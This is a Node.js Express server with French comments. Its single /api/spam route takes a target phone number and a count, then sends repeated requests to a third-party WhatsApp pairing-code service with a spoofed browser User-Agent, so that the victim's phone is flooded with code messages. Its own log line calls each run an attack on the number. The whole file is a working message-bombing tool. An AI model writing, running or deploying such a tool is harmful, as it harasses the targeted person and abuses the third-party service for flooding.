const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// On sert les fichiers statiques
app.use(express.static(path.join(__dirname, 'public')));

// Route API
app.post('/api/spam', async (req, res) => {
    const { number, count } = req.body;

    if (!number || !count) {
        return res.status(400).json({ error: 'Numéro et nombre requis' });
    }

    console.log(`[${new Date().toISOString()}] Attaque lancée vers ${number} x${count}`);

    let results = [];
    let successCount = 0;
    let failCount = 0;

    try {
        for (let i = 0; i < count; i++) {
            try {
                // On utilise fetch avec un timeout plus long (10s)
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);

                const response = await fetch(`https://prabath-md-pair-web-v2-slk.koyeb.app/code?number=${encodeURIComponent(number)}`, {
                    signal: controller.signal,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });

                clearTimeout(timeoutId);

                // Si le serveur répond autre chose que 200-299, c'est une erreur
                if (!response.ok) {
                    throw new Error(`HTTP Error: ${response.status}`);
                }

                // On essaie de lire la réponse (même si elle est vide)
                await response.text(); 
                
                results.push({ status: 'OK', time: new Date().toISOString() });
                successCount++;

            } catch (err) {
                results.push({ status: 'Error', error: err.message, time: new Date().toISOString() });
                failCount++;
            }

            // Délai entre les envois (800ms pour être plus doux avec le serveur cible)
            if (i < count - 1) {
                await new Promise(resolve => setTimeout(resolve, 800));
            }
        }

        res.json({ 
            success: true, 
            message: `${successCount} réussi(s), ${failCount} échoué(s)`, 
            details: results 
        });

    } catch (globalErr) {
        res.status(500).json({ error: 'Erreur critique', details: globalErr.message });
    }
});

app.listen(PORT, () => {
    console.log(`Serveur prêt sur le port ${PORT}`);
});
